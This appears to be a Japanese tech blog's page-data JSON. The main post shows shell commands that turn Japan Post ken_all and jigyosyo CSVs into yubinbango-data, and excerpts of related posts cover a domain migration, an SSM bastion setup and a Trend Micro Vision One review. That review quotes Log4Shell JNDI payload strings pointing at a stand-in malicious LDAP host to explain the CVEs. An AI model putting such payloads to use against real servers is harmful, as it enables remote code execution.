{"componentChunkName":"component---src-templates-post-tsx","path":"/posts/90","result":{"data":{"esaPost":{"number":90,"relative_category":"blog/backend","fields":{"title":"yubinbango-dataをどうやって生成するか","excerpt":"郵便番号から住所を補完するライブラリ「yubinbango」を継続的に利用するにあたり、当該ライブラリが参照している郵便データ「yubinbango-data」を自前でメンテナンスできるか確認します。   > PROBLEMPROBLEM \n\n- 「yubinbango/yubinbango」を利用するにあたり「yubinbango/yubinbango-data」の更新が継続的に行われるかサービス継続性の懸念がある そこで自前でメンテナンスをする場合の対処方法を事前に知っておきたい \n- そこで自前でメンテナンスをする場合の対処方法を事前に知っておきたい  > SOLUTIONSOLUTION \n\nというわけで、yubinbango-dataの中身であるken_all.csvとjigyosyo.csvを安定して変換する方法を確認します。  > ken_all.csvを正規化するken_all.csvを正規化する \n\nyubinbango-dataのken_all.csvの部分はアイビスが提供しているzipcloudを参照しているようなので、そちらに合わせて利用します。 sh\n\nsudo apt install nkf { curl -sSL \"http://zipcloud.ibsnet.co.jp/zipcodedata/download?di=1625040649647\" -o ./x_ken_all.zip; unzip -p x_ken_all.zip | nkf -w; rm x_ken_all.zip } >ken_all.csv  \n\nzipcloudを使うことに抵抗がある場合はgokenallもありますが、正規化によって一つの郵便番号に複数の町名番地が存在するため郵便番号をキーとするyubinbango-dataに変換する際には工夫が必要です。 sh\n\ngo get github.com/oirik/gokenall/cmd/kenall { kenall download -x | kenall normalize } >ken_all.csv   > jigyosyo.csvを取得するjigyosyo.csvを取得する \n\njigyosyo.csvは特に正規化は必要ないです。 sh\n\n{ curl -sSL https://www.post.japanpost.jp/zipcode/dl/jigyosyo/zip/jigyosyo.zip -o ./jigyosyo.zip; unzip -p jigyosyo.zip | nkf -w; rm jigyosyo.zip } >jigyosyo.csv   > yubinbango-dataを生成するyubinbango-dataを生成する \n\nken_all.csvとjigyosyo.csvをUNIONしてjqで郵便番号をキーとしたオブジェクトに変換します。一部buildingカラムがnullを持っておりyubinbango-dataと異なる部分はありますが、大凡同等の状態にまで持っていくことが出来ました。 sh\n\nbrew install noborus/tap/trdsql for i in {001..999}; do trdsql -ojson \" SELECT * FROM ( SELECT c3 zip, c8 city, c9 town, NULL building FROM ken_all.csv UNION SELECT c8 zip, c5 city, c6 town, c7 building FROM jigyosyo.csv ) WHERE SUBSTRING(zip,0,4) = '$i' ORDER BY zip ASC \" \\ | jq --compact-output ' . | to_entries | map({ (.value.zip): [1, .value.city, .value.town, .value.building] }) | add ' \\ | sed -E 's/(.+?)/$yubin(\\1);/g' \\ >$i.js; done   > WRAPUPWRAPUP \n\n昔から何かと話題に上がるken_all.csvですが、正規化のサービスに加えCSV用SQLクライアントとjqの登場により思った以上に簡単に変換することができました。","thumbnail":"https://img.esa.io/uploads/production/attachments/16651/2021/07/25/97367/d69e2c83-0aae-4409-804a-7f7ee0ce456c.png"},"wip":false,"body_md":"郵便番号から住所を補完するライブラリ「yubinbango」を継続的に利用するにあたり、当該ライブラリが参照している郵便データ「yubinbango-data」を自前でメンテナンスできるか確認します。\r\n\r\n<img width=\"710\" alt=\"thumbnail\" src=\"https://img.esa.io/uploads/production/attachments/16651/2021/07/25/97367/d69e2c83-0aae-4409-804a-7f7ee0ce456c.png\">\r\n\r\n# PROBLEM\r\n- 「[yubinbango/yubinbango](https://github.com/yubinbango/yubinbango)」を利用するにあたり「[yubinbango/yubinbango-data](https://github.com/yubinbango/yubinbango-data)」の更新が継続的に行われるかサービス継続性の懸念がある\r\n    - そこで自前でメンテナンスをする場合の対処方法を事前に知っておきたい\r\n\r\n# SOLUTION\r\nというわけで、yubinbango-dataの中身である[ken_all.csvとjigyosyo.csv](https://www.post.japanpost.jp/zipcode/download.html)を安定して変換する方法を確認します。\r\n\r\n## ken_all.csvを正規化する\r\nyubinbango-dataのken_all.csvの部分はアイビスが提供している[zipcloud](http://zipcloud.ibsnet.co.jp)を参照しているようなので、そちらに合わせて利用します。\r\n```sh\r\nsudo apt install nkf\r\n{ \r\n  curl -sSL \"http://zipcloud.ibsnet.co.jp/zipcodedata/download?di=1625040649647\" -o ./x_ken_all.zip;\r\n  unzip -p x_ken_all.zip | nkf -w;\r\n  rm x_ken_all.zip\r\n} >ken_all.csv\r\n```\r\n\r\nzipcloudを使うことに抵抗がある場合は[gokenall](https://github.com/oirik/gokenall)もありますが、正規化によって一つの郵便番号に複数の町名番地が存在するため郵便番号をキーとするyubinbango-dataに変換する際には工夫が必要です。\r\n\r\n```sh\r\ngo get github.com/oirik/gokenall/cmd/kenall\r\n{ kenall download -x | kenall normalize } >ken_all.csv\r\n```\r\n\r\n## jigyosyo.csvを取得する\r\njigyosyo.csvは特に正規化は必要ないです。\r\n\r\n```sh\r\n{ \r\n  curl -sSL https://www.post.japanpost.jp/zipcode/dl/jigyosyo/zip/jigyosyo.zip -o ./jigyosyo.zip;\r\n  unzip -p jigyosyo.zip | nkf -w;\r\n  rm jigyosyo.zip\r\n} >jigyosyo.csv\r\n```\r\n\r\n## yubinbango-dataを生成する\r\nken_all.csvとjigyosyo.csvをUNIONしてjqで郵便番号をキーとしたオブジェクトに変換します。一部buildingカラムがnullを持っておりyubinbango-dataと異なる部分はありますが、大凡同等の状態にまで持っていくことが出来ました。\r\n\r\n```sh\r\nbrew install noborus/tap/trdsql\r\nfor i in {001..999}; do\r\n  trdsql -ojson \"\r\n    SELECT *\r\n    FROM (\r\n      SELECT c3 zip, c8 city, c9 town, NULL building FROM ken_all.csv\r\n      UNION SELECT c8 zip, c5 city, c6 town, c7 building FROM jigyosyo.csv\r\n    )\r\n    WHERE SUBSTRING(zip,0,4) = '$i'\r\n    ORDER BY zip ASC\r\n  \" \\\r\n  | jq --compact-output '\r\n    .\r\n    | to_entries\r\n    | map({ (.value.zip): [1, .value.city, .value.town, .value.building] })\r\n    | add\r\n  ' \\\r\n  | sed -E 's/(.+?)/$yubin(\\1);/g' \\\r\n  >$i.js;\r\ndone\r\n```\r\n\r\n# WRAPUP\r\n昔から何かと話題に上がるken_all.csvですが、正規化のサービスに加えCSV用SQLクライアントとjqの登場により思った以上に簡単に変換することができました。","body_html":"<p data-sourcepos=\"1:1-1:250\">郵便番号から住所を補完するライブラリ「yubinbango」を継続的に利用するにあたり、当該ライブラリが参照している郵便データ「yubinbango-data」を自前でメンテナンスできるか確認します。</p>\n<a href=\"https://img.esa.io/uploads/production/attachments/16651/2021/07/25/97367/d69e2c83-0aae-4409-804a-7f7ee0ce456c.png\" target=\"_blank\" rel=\"noopener noreferrer\"><img width=\"710\" alt=\"thumbnail\" src=\"https://img.esa.io/uploads/production/attachments/16651/2021/07/25/97367/d69e2c83-0aae-4409-804a-7f7ee0ce456c.png\"></a>\n<h1 data-sourcepos=\"5:1-5:9\" id=\"1-0-0\" name=\"1-0-0\"><a class=\"anchor\" id=\"PROBLEM\" name=\"PROBLEM\" href=\"#PROBLEM\" data-position=\"1-0-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"PROBLEM\"> &gt; PROBLEM</span></a>PROBLEM</h1>\n<ul data-sourcepos=\"6:1-8:0\">\n<li data-sourcepos=\"6:1-8:0\">「<a href=\"https://github.com/yubinbango/yubinbango\" target=\"_blank\" rel=\"noopener noreferrer\">yubinbango/yubinbango</a>」を利用するにあたり「<a href=\"https://github.com/yubinbango/yubinbango-data\" target=\"_blank\" rel=\"noopener noreferrer\">yubinbango/yubinbango-data</a>」の更新が継続的に行われるかサービス継続性の懸念がある\n<ul data-sourcepos=\"7:5-8:0\">\n<li data-sourcepos=\"7:5-8:0\">そこで自前でメンテナンスをする場合の対処方法を事前に知っておきたい</li>\n</ul></li>\n</ul>\n<h1 data-sourcepos=\"9:1-9:10\" id=\"2-0-0\" name=\"2-0-0\"><a class=\"anchor\" id=\"SOLUTION\" name=\"SOLUTION\" href=\"#SOLUTION\" data-position=\"2-0-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"SOLUTION\"> &gt; SOLUTION</span></a>SOLUTION</h1>\n<p data-sourcepos=\"10:1-10:189\">というわけで、yubinbango-dataの中身である<a href=\"https://www.post.japanpost.jp/zipcode/download.html\" target=\"_blank\" rel=\"noopener noreferrer\">ken_all.csvとjigyosyo.csv</a>を安定して変換する方法を確認します。</p>\n<h2 data-sourcepos=\"12:1-12:32\" id=\"2-1-0\" name=\"2-1-0\"><a class=\"anchor\" id=\"ken_all.csvを正規化する\" name=\"ken_all.csvを正規化する\" href=\"#ken_all.csvを正規化する\" data-position=\"2-1-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"ken_all.csvを正規化する\"> &gt; ken_all.csvを正規化する</span></a>ken_all.csvを正規化する</h2>\n<p data-sourcepos=\"13:1-13:195\">yubinbango-dataのken_all.csvの部分はアイビスが提供している<a href=\"http://zipcloud.ibsnet.co.jp\" target=\"_blank\" rel=\"noopener noreferrer\">zipcloud</a>を参照しているようなので、そちらに合わせて利用します。</p>\n<div class=\"code-block\" data-sourcepos=\"14:1-21:3\"><div class=\"code-filename\"><i class=\"fa fa-file-code-o\"></i>sh</div><div class=\"highlight\"><pre class=\"highlight shell\"><code><span class=\"nb\">sudo </span>apt <span class=\"nb\">install </span>nkf\n<span class=\"o\">{</span> \n  curl <span class=\"nt\">-sSL</span> <span class=\"s2\">\"http://zipcloud.ibsnet.co.jp/zipcodedata/download?di=1625040649647\"</span> <span class=\"nt\">-o</span> ./x_ken_all.zip<span class=\"p\">;</span>\n  unzip <span class=\"nt\">-p</span> x_ken_all.zip | nkf <span class=\"nt\">-w</span><span class=\"p\">;</span>\n  <span class=\"nb\">rm </span>x_ken_all.zip\n<span class=\"o\">}</span> <span class=\"o\">&gt;</span>ken_all.csv\n</code></pre></div></div>\n<p data-sourcepos=\"23:1-23:296\">zipcloudを使うことに抵抗がある場合は<a href=\"https://github.com/oirik/gokenall\" target=\"_blank\" rel=\"noopener noreferrer\">gokenall</a>もありますが、正規化によって一つの郵便番号に複数の町名番地が存在するため郵便番号をキーとするyubinbango-dataに変換する際には工夫が必要です。</p>\n<div class=\"code-block\" data-sourcepos=\"25:1-28:3\"><div class=\"code-filename\"><i class=\"fa fa-file-code-o\"></i>sh</div><div class=\"highlight\"><pre class=\"highlight shell\"><code>go get github.com/oirik/gokenall/cmd/kenall\n<span class=\"o\">{</span> kenall download <span class=\"nt\">-x</span> | kenall normalize <span class=\"o\">}</span> <span class=\"o\">&gt;</span>ken_all.csv\n</code></pre></div></div>\n<h2 data-sourcepos=\"30:1-30:30\" id=\"2-2-0\" name=\"2-2-0\"><a class=\"anchor\" id=\"jigyosyo.csvを取得する\" name=\"jigyosyo.csvを取得する\" href=\"#jigyosyo.csvを取得する\" data-position=\"2-2-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"jigyosyo.csvを取得する\"> &gt; jigyosyo.csvを取得する</span></a>jigyosyo.csvを取得する</h2>\n<p data-sourcepos=\"31:1-31:54\">jigyosyo.csvは特に正規化は必要ないです。</p>\n<div class=\"code-block\" data-sourcepos=\"33:1-39:3\"><div class=\"code-filename\"><i class=\"fa fa-file-code-o\"></i>sh</div><div class=\"highlight\"><pre class=\"highlight shell\"><code><span class=\"o\">{</span> \n  curl <span class=\"nt\">-sSL</span> https://www.post.japanpost.jp/zipcode/dl/jigyosyo/zip/jigyosyo.zip <span class=\"nt\">-o</span> ./jigyosyo.zip<span class=\"p\">;</span>\n  unzip <span class=\"nt\">-p</span> jigyosyo.zip | nkf <span class=\"nt\">-w</span><span class=\"p\">;</span>\n  <span class=\"nb\">rm </span>jigyosyo.zip\n<span class=\"o\">}</span> <span class=\"o\">&gt;</span>jigyosyo.csv\n</code></pre></div></div>\n<h2 data-sourcepos=\"41:1-41:33\" id=\"2-3-0\" name=\"2-3-0\"><a class=\"anchor\" id=\"yubinbango-dataを生成する\" name=\"yubinbango-dataを生成する\" href=\"#yubinbango-dataを生成する\" data-position=\"2-3-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"yubinbango-dataを生成する\"> &gt; yubinbango-dataを生成する</span></a>yubinbango-dataを生成する</h2>\n<p data-sourcepos=\"42:1-42:288\">ken_all.csvとjigyosyo.csvをUNIONしてjqで郵便番号をキーとしたオブジェクトに変換します。一部buildingカラムがnullを持っておりyubinbango-dataと異なる部分はありますが、大凡同等の状態にまで持っていくことが出来ました。</p>\n<div class=\"code-block\" data-sourcepos=\"44:1-65:3\"><div class=\"code-filename\"><i class=\"fa fa-file-code-o\"></i>sh</div><div class=\"highlight\"><pre class=\"highlight shell\"><code>brew <span class=\"nb\">install </span>noborus/tap/trdsql\n<span class=\"k\">for </span>i <span class=\"k\">in</span> <span class=\"o\">{</span>001..999<span class=\"o\">}</span><span class=\"p\">;</span> <span class=\"k\">do\n  </span>trdsql <span class=\"nt\">-ojson</span> <span class=\"s2\">\"\n    SELECT *\n    FROM (\n      SELECT c3 zip, c8 city, c9 town, NULL building FROM ken_all.csv\n      UNION SELECT c8 zip, c5 city, c6 town, c7 building FROM jigyosyo.csv\n    )\n    WHERE SUBSTRING(zip,0,4) = '</span><span class=\"nv\">$i</span><span class=\"s2\">'\n    ORDER BY zip ASC\n  \"</span> <span class=\"se\">\\</span>\n  | jq <span class=\"nt\">--compact-output</span> <span class=\"s1\">'\n    .\n    | to_entries\n    | map({ (.value.zip): [1, .value.city, .value.town, .value.building] })\n    | add\n  '</span> <span class=\"se\">\\</span>\n  | <span class=\"nb\">sed</span> <span class=\"nt\">-E</span> <span class=\"s1\">'s/(.+?)/$yubin(\\1);/g'</span> <span class=\"se\">\\</span>\n  <span class=\"o\">&gt;</span><span class=\"nv\">$i</span>.js<span class=\"p\">;</span>\n<span class=\"k\">done</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"67:1-67:8\" id=\"3-0-0\" name=\"3-0-0\"><a class=\"anchor\" id=\"WRAPUP\" name=\"WRAPUP\" href=\"#WRAPUP\" data-position=\"3-0-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"WRAPUP\"> &gt; WRAPUP</span></a>WRAPUP</h1>\n<p data-sourcepos=\"68:1-68:208\">昔から何かと話題に上がるken_all.csvですが、正規化のサービスに加えCSV用SQLクライアントとjqの登場により思った以上に簡単に変換することができました。</p>\n","tags":["yubinbango","ken_all.csv","jq","trdsql"],"updated_at":"2021-07-25T12:07:20+09:00","childPublishedDate":{"published_on":"2021-07-25T00:00:00.000Z"},"updated_by":{"name":"なびの👷","screen_name":"nabinno","icon":"https://img.esa.io/uploads/production/members/94286/icon/thumb_m_ef5f024307008aa399b91f87fa5f64e8.jpg"}},"relatedPosts":{"edges":[{"node":{"number":137,"relative_category":"blog/backend","fields":{"title":"G Suite無償版停止に伴い、MXレコード等のドメイン管理を整理した","excerpt":"今回は10年以上利用していたG Suite無償版が2022年8月に停止されるとのことで、メールアドレスの管理をどうするか検討しました。メール管理は別のGMailアカウントを使っていたので、転送できれば良いのですが、これを機にドメイン管理をAWSにまとめていくことを思いつきました。   > PROBLEMPROBLEM \n\n- 10年以上利用していたG Suite無償版が2022年8月に停止され、メールアドレスの管理をどうしようか Google Workspaceにアップグレードしても良いけどBusiness Starterプランにしても面白みがないので別の方法を探したい G Suiteはメールしか利用しておらず、メール管理は別のGMailアカウントを使っていたのでメール転送機能で代替できそう \n- Google Workspaceにアップグレードしても良いけどBusiness Starterプランにしても面白みがないので別の方法を探したい G Suiteはメールしか利用しておらず、メール管理は別のGMailアカウントを使っていたのでメール転送機能で代替できそう \n- G Suiteはメールしか利用しておらず、メール管理は別のGMailアカウントを使っていたのでメール転送機能で代替できそう  > SOLUTIONSOLUTION \n\nと言うわけで、今回はG Suiteアカウントの利用を止めて、MXレコード周りを整理することにしました。個人利用なのでドメイン管理は既存のままで良かったのですが、証跡管理のない状況に耐えられずAWSに移管。メール転送機能はPOBOX以外はサブアドレス対応していなかったのですが、キャッチオール対応できるのでまずは良しとしています。現時点での構成は下記の通り。 \n\nなお、複数人数で必要になった場合は、サブアドレスとグループアドレスが対応可能なAmazon Workmailに移管する予定ですが、これでもGoogle Workspaceを利用するよりコストは半分程で済みます。  > 構成構成  > beforebefore \n\n- ドメイン管理 バリュードメイン\n- MXレコード G Suite\n- SMTP G Suite  > afterafter \n\n- ドメイン管理 Amazon Route 53\n- MXレコード Cloudflare Email Routing\n- SMTP Amazon SES  > 手順手順 \n\n方針が決まるまでいくつかメールサービスを検討したのですが、決まってしまえばやることは単純です。  > 1. ドメイン管理を整理する1. ドメイン管理を整理する \n\n基本はドメイン移管申請ですが、G Suiteを後ほど削除することを考慮してMXレコードをCloudflare Email Routingに変更。本来はこの処理の前にG Suiteに紐付いている各サービスの設定変更が必要になります。 \n\n1. 移管元にてWHOIS情報公開代行の解除\n2. 移管元にてドメインロックの解除\n3. 移管元にて認証鍵 (Auth-Code) を確認\n4. 移管先にてホストゾーンの作成、各レコードの内容を移管元に合わせる\n5. Cloudflare Email Routingにて転送先メールアドレスを検証する\n6. 移管先にてMXレコードをCloudflare Email Routingのものを設定する\n7. 移管元のNSレコードを移管先に変更\n8. 移管先にて認証鍵をつかい移管申請を行う\n9. 移管元に対して移管申請を行った旨をメールにて連携する \n\n- ドメインの他社への移管 | バリュードメイン ユーザーガイド\n- ドメイン登録の Amazon Route 53 への移管 - Amazon Route 53\n- Easily creating and routing email addresses with Cloudflare Email Routing  > 2. SMTPを設定する2. SMTPを設定する \n\n最近はセキュリティ対策のためGMailのSMTPが使いづらくなっているので、今回はAmazon SESを利用しました。サンドボックス解除のため下記の通りサポートに依頼しました。 txt\n\n# メールタイプ 通例の取引がメインとなる予定です # ユースケース ## メールを送信する頻度 週に1-2回 ## 受信者リストのメンテナンス方法 四半期に一度の棚卸し ## バウンス対応 当該メールアドレスの削除 ## 申し立て対応 当該メールアドレスへのフラグ管理 ## 解除申請の管理方法 メールでの受付 ## 送信予定のメールサンプル {{宛先名}}様 お世話になっております。 表題の件につきまして1点問い合わせします。 {{問い合わせ内容}} ご不明な点等ございましたらお気軽にお問い合わせ下さい。 どうぞ、よろしくお願い致します。   > WRAPUPWRAPUP \n\n以前からドメイン管理をAWSに移管したかったのですが、積極的な理由がないためなおざりになっていました。今回のG Suite無償版の期限切れに伴い整理できすっきりしたので、これを機にいろいろ整理していきたいですね。"},"name":"[2022-04-12]G Suite無償版停止に伴い、MXレコード等のドメイン管理を整理した","tags":[],"childPublishedDate":{"published_on":"2022-04-12T00:00:00.000Z","published_on_unix":1649721600}}},{"node":{"number":119,"relative_category":"blog/backend","fields":{"title":"踏み台をSSM Session ManagerとAWS SSOで実現する","excerpt":"踏み台のユーザーが増えてきたため公開鍵管理や監視と運用負荷が上がってきました。オペミスが発生しやすい上 監査的な意味で無視できない状況になってきたので重い腰を上げることにしました。   > PROBLEMPROBLEM \n\n- EC2インスタンスの踏み台運用がつらい 公開鍵管理がつらい 提出・設定・確認ともに運用コストがかかる AWSアカウント数 x ユーザー数で指数関数的に運用コストが増していくことが想定される インフラ管理が分散していると、提出側・設定側ともに重複コストが発生する 監視運用がつらい 定期的に踏み台がブルートフォース攻撃を受けており、脅威が低いとは言えストレスがかかる 踏み台アクセスへの監査ログが不十分 \n- 公開鍵管理がつらい 提出・設定・確認ともに運用コストがかかる AWSアカウント数 x ユーザー数で指数関数的に運用コストが増していくことが想定される インフラ管理が分散していると、提出側・設定側ともに重複コストが発生する \n- 提出・設定・確認ともに運用コストがかかる\n- AWSアカウント数 x ユーザー数で指数関数的に運用コストが増していくことが想定される\n- インフラ管理が分散していると、提出側・設定側ともに重複コストが発生する\n- 監視運用がつらい 定期的に踏み台がブルートフォース攻撃を受けており、脅威が低いとは言えストレスがかかる 踏み台アクセスへの監査ログが不十分 \n- 定期的に踏み台がブルートフォース攻撃を受けており、脅威が低いとは言えストレスがかかる\n- 踏み台アクセスへの監査ログが不十分  > SOLUTIONSOLUTION \n\nというわけで、Session ManagerとSSOでアクセス管理の効率化を狙います。  > 踏み台サーバーの設定踏み台サーバーの設定 \n\nまず、データフローとしては下記の図の通りで、今回はプライベートサブネット上にEC2を置いて素のSession ManagerでDBへの接続することにします。当該インスタンスは AmazonSSMManagedInstanceCore ポリシー1を含んだロールを適用。なお、ECS ExecではSession Managerでポートフォワーディングを実現でき無かったことに加え、既存の踏み台資産を流用するため今回の実装対象から外しました。 \n\n  > SSOの設定SSOの設定 \n\n踏み台サーバーの設定が終わったら、次に当該インスタンスへ接続するためにSSOで渡すロールをアクセス権限セットに設定します。下記カスタムポリシーはEC2インスタンスにアクセスするための必要最低限のものになります。 カスタムポリシー json\n\n{ \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": [ \"cloudwatch:PutMetricData\", \"ds:CreateComputer\", \"ds:DescribeDirectories\", \"ec2:DescribeInstanceStatus\", \"logs:*\", \"ssm:*\", \"ec2messages:*\" ], \"Resource\": \"*\" }, { \"Effect\": \"Allow\", \"Action\": [ \"ssm:StartSession\" ], \"Resource\": [ \"arn:aws:ssm:*:*:session/<EC2インスタンスID>\", \"arn:aws:ec2:*:*:instance/<EC2インスタンスID>\" ] }, { \"Effect\": \"Deny\", \"Action\": [ \"ssm:Describe*\", \"ssm:Get*\", \"ssm:List*\", \"logs:Describe*\", \"logs:Get*\", \"logs:List*\" ], \"Resource\": \"*\" }, { \"Effect\": \"Allow\", \"Action\": \"iam:CreateServiceLinkedRole\", \"Resource\": \"arn:aws:iam::*:role/aws-service-role/ssm.amazonaws.com/AWSServiceRoleForAmazonSSM*\", \"Condition\": { \"StringLike\": { \"iam:AWSServiceName\": \"ssm.amazonaws.com\" } } }, { \"Effect\": \"Allow\", \"Action\": \"iam:CreateServiceLinkedRole\", \"Resource\": \"arn:aws:iam::*:role/aws-service-role/ssm.amazonaws.com/AWSServiceRoleForAmazonSSM*\", \"Condition\": { \"StringLike\": { \"iam:AWSServiceName\": \"ssm.amazonaws.com\" } } }, { \"Effect\": \"Allow\", \"Action\": [ \"iam:DeleteServiceLinkedRole\", \"iam:GetServiceLinkedRoleDeletionStatus\" ], \"Resource\": \"arn:aws:iam::*:role/aws-service-role/ssm.amazonaws.com/AWSServiceRoleForAmazonSSM*\" }, { \"Effect\": \"Allow\", \"Action\": [ \"ssmmessages:CreateControlChannel\", \"ssmmessages:CreateDataChannel\", \"ssmmessages:OpenControlChannel\", \"ssmmessages:OpenDataChannel\" ], \"Resource\": \"*\" } ] }    > セッションを張るための事前準備セッションを張るための事前準備 \n\nセッションを張るためには下記3つの手順が必要になります。SSO経由のセッション設定が2通りありますが、クレデンシャル方式はセッションが切れる毎に変更する手間があるため、CLI方式をお薦めします。 \n\n1. AWS CLI v2をインストール\n2. 下記いずれかの方式でSSO経由のセッション設定を行う クレデンシャル方式 CLI（ aws sso login ）方式 \n3. クレデンシャル方式\n4. CLI（ aws sso login ）方式\n5. Session Manager プラグインをインストール  > DBクライアントの設定DBクライアントの設定 \n\n最後に、DBクライアントについて3つの手順を踏んで接続を試みます2。なお、ローカル環境でポートフォワーディングを都度行うのを省略したい方は、DataGripを利用すると良いでしょう。 \n\n1. ローカル環境にて ~/.ssh/config ファイルを編集 Session Managerにproxyと対象RDSのエンドポイントを記載 configHost <任意のhost名> HostName <※ 指定しなければlocalhostになる> User ec2-user ProxyCommand sh -c \"aws ssm start-session --target <接続する踏み台のインスタンスID> --document-name AWS-StartSSHSession --parameters 'portNumber=%p' --region ap-northeast-1 --profile <プロフィール>\" LocalForward <任意のポート> <RDSエンドポイント>:<RDSポート> IdentityFile ~/.ssh/<EC2に接続する秘密鍵> 設定したhost名でセッションマネージャー越しにssh接続できるかを確認 sh$ ssh <設定したhost名> \n2. Session Managerにproxyと対象RDSのエンドポイントを記載 configHost <任意のhost名> HostName <※ 指定しなければlocalhostになる> User ec2-user ProxyCommand sh -c \"aws ssm start-session --target <接続する踏み台のインスタンスID> --document-name AWS-StartSSHSession --parameters 'portNumber=%p' --region ap-northeast-1 --profile <プロフィール>\" LocalForward <任意のポート> <RDSエンドポイント>:<RDSポート> IdentityFile ~/.ssh/<EC2に接続する秘密鍵> \n3. 設定したhost名でセッションマネージャー越しにssh接続できるかを確認 sh$ ssh <設定したhost名> \n4. 手順1で設定したsshで接続することでポートフォワーディング\n5. DBクライアントで下記のように接続情報を設定し接続する Host: <手順1のconfigファイルにて任意指定したホスト名> Port: <手順4のconfigファイルにて任意指定したポート> 他項目: DB接続情報 \n6. Host: <手順1のconfigファイルにて任意指定したホスト名>\n7. Port: <手順4のconfigファイルにて任意指定したポート>\n8. 他項目: DB接続情報  > WRAPUPWRAPUP \n\nパブリックサブネット上の踏み台に慣れている方は馴染みのない方法に戸惑うかも知れませんが、踏み台資産を流用できるという意味で導入のコストもそれほどかかりませんし、ユーザーとしても利用の敷居は高くありませんでした。後々の管理コストを心配している方は一度検討してみてはいかがでしょうか。  \n\n1. AmazonEC2RoleforSSM は非推奨のため適用しないように注意します。 ↩ \n2. 今回はメンテナンスコストを避けるためSSH over SSMの関連ツール ssh-ssm.sh ssm-tool は使わない方針でいます。 ↩"},"name":"[2021-11-21]踏み台をSSM Session ManagerとAWS SSOで実現する","tags":["session-manager","aws-sso"],"childPublishedDate":{"published_on":"2021-11-21T00:00:00.000Z","published_on_unix":1637452800}}},{"node":{"number":127,"relative_category":"blog/soc","fields":{"title":"Trend Micro Vision Oneを試してみる","excerpt":"11月末から続いているLog4jの脆弱性について各セキュリティスコアが高レベルで指定されており、これを気にZTAの文脈でセキュリティ製品を見ていこうと思います。今回はちょうど無償提供されているTrend Micro Vision Oneを軽く触ってみようと思います。   > PROBLEMPROBLEM \n\n- 11月末から続いているLog4jの脆弱性について各セキュリティスコアが高レベルで指定されている JNDIクエリ「${jndi:ldap://malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-44228） JNDIクエリ「${jndi:ldap://127.0.0.1#malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-45046） \n- JNDIクエリ「${jndi:ldap://malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-44228）\n- JNDIクエリ「${jndi:ldap://127.0.0.1#malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-45046）  > SOLUTIONSOLUTION  \n\nFrom: Trend Micro\n Subject: Log4Shell診断ツール ご提供開始 \n\nApache Log4j2ログ出力ライブラリの複数のバージョンに影響を与える深刻な脆弱性情報が公開されています。当診断ツールは、Log4Shellの影響を受ける可能性のあるエンドポイントとWebアプリケーションを特定することができます。また、攻撃対象領域の詳細を即座に可視化し、リスクを軽減するための措置をご案内いたします。  \n\nと言うわけで、Trend Micro Vision Oneの一部機能が無償で提供されていたので確認します。Vision OneはSIEM、SOAR、EDR関連のツール。エンドポイント、サーバ、クラウド、メールおよびネットワーク全体を保護する各セキュリティ製品がセンサーとなり、各々のレイヤ―で検知した脅威や侵入の痕跡を、Threat Intelligenceを活用してサイバー攻撃の全体像を可視化します。  > Log4jShell診断ツールを試してみるLog4jShell診断ツールを試してみる \n\n1. Trend Micro Vision Oneにログイン\n2. [Log4Shell診断ツール]画面にてWindows/Mac/Linuxいずれかの診断ツールをダウンロード\n3. 1分ほどで端末にインストールされ、詳細が確認できる\n4. 自宅の端末で確認した結果はこちら \n5.  \n\nざっと試したところ数分程度でLog4Shellの診断を行う事ができました。Intune等EMMでの展開もそれほど難しくないように思います。  > 他の機能を確認他の機能を確認 \n\n先ほど試したLog4Shell診断ツールはTrend Micro Vision OneのAssessmentカテゴリのいち機能になります。Vision OneはSecurity Postureによる方針策定、Assessment・Thread Intelligenceによる脅威検出、XDR（EDR）による脅威応答、Zero Trust Secure Access・Mobile Securityによる脅威防御、Inventory Managementによる脅威特定から構成されています。  > Security PostureSecurity Posture \n\n各種リスク、脅威を表示することで、セキュリティに関する心構えとともに方針策定のヒントを提示します。    function description     Security Dashboard Company Risk Index、エンドポイントレポート、MITRE ATT&CK MATRIXマップ   Zero Trust Risk Insights アカウント侵害、脆弱性の検出、異常検出、クラウドアプリのアクティビティ、XDR検出、脅威検出     > AssessmentAssessment \n\n各種端末に対して脅威検出等のセキュリティ評価を行います。    function description     Targeted Attack Detection 標的型攻撃の検出   Security Assessment セキュリティ評価、Log4jの脆弱性検出     > Threat IntelligenceThreat Intelligence \n\n内部および外部ソースを元に分析を行い環境内の潜在的な脅威を特定します。    function description     Intelligence Reports 内部および外部のソースからの最新のインテリジェンスレポートを統合して、環境内の潜在的な脅威を特定   Suspicous Object Management 特定の疑わしいオブジェクトを検出した後に実行する接続製品のアクションを指定できます   Sandbox Analysis -     > XDR（EDR）XDR（EDR） \n\n検出モデルと応答サービスを管理します。    function description     Detection Model Management 検出モデルの管理   Workbench -   Observed Attack Techniques 観察された攻撃手法   Managed XDR マネージドXDRは検出および応答の代行サービス     > Zero Trust Secure AccessZero Trust Secure Access \n\n各種アクセス制御を管理します。    function description     Secure Access Overview -   Secure Access Rules IAM、ログイン制御   Access Control History -   Private Access Configuration プライベートアクセス制御   Internet Access Configuration インターネットアクセス制御     > Response ManagementResponse Management \n\n応答サービスを管理するものだと思いますが、XDR（EDR）との区別がよく分かりません。    function description     Response Management      > Mobile SecurityMobile Security \n\nモバイル端末に特化したセキュリティ機能、検出ログや管理ポリシーを扱います。EMM連携も可能です。    function description     Mobile Detection Logs モバイル端末検出ログ   Mobile Policy モバイル端末管理ポリシー   Risky Mobile Apps MDMとの統合機能     > Inventory ManagementInventory Management \n\n各種リソースの一覧表になります。    function description     Endpoint Inventory エンドポイント端末一覧表   Email Account Inventory Eメールアカウント一覧表   Network Inventory ネットワーク一覧表   Service Gateway Inventory サービスゲートウェイ一覧表   Mobile Inventory モバイル端末一覧表     > WRAPUPWRAPUP \n\nTrend Micro 